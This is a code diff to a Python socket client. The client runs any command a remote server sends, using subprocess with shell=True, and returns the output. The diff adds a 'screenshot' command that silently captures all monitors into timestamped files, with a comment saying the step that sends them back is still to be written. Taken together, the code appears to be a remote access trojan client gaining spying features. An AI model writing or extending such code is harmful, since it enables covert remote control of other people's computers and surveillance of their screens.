@@ -2,6 +2,10 @@ import socket
 import subprocess
 import select
 import threading
+from datetime import datetime
+import os
+
+from mss import mss # Multiple ScreenShot
 # https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example
 
 
@@ -32,7 +36,9 @@ def get_data(sock: socket.socket):
     try: 
         res = sock.recv(1024).decode('utf-8')
         print(f'Server response : {res}')
-        if res != 'Alive ping back received':
+        if res == 'screenshot':
+            send_screenshot()
+        elif res != 'Alive ping back received':
             command = res.split(' ')
             res = exec_command(command)
             send_data(sock, res) # Returning command output
@@ -42,14 +48,27 @@ def get_data(sock: socket.socket):
         pass # local closing
 
 
-# example : command = ['powershell', 'start', 'brave', 'www.google.com']
 def exec_command(command):
+    """ example : command = ['powershell', 'start', 'brave', 'www.google.com']"""
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
     output = result.stdout or result.stderr
     if output:
         print(output)
     return output
+
+
+# REFACTOR : Make the packet size handler before the sending part
+def send_screenshot():
+    with mss() as sct:
+        sct.compression_level = 9 # max compression = +- 50 ko file
+        time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
+        for filename in sct.save(mon=-1, output=f'./screenshots/{time_stamp}.png'): #-1 : fusion of all monitor
+            print(filename)
+
+        # filename = "./screenshots/2024-10-23_21H07.png"
+        file_stats = os.stat(filename)
+        print(f'File Size in Bytes is {file_stats.st_size}')
 
 
 def listen_for_commands(sock : socket.socket):
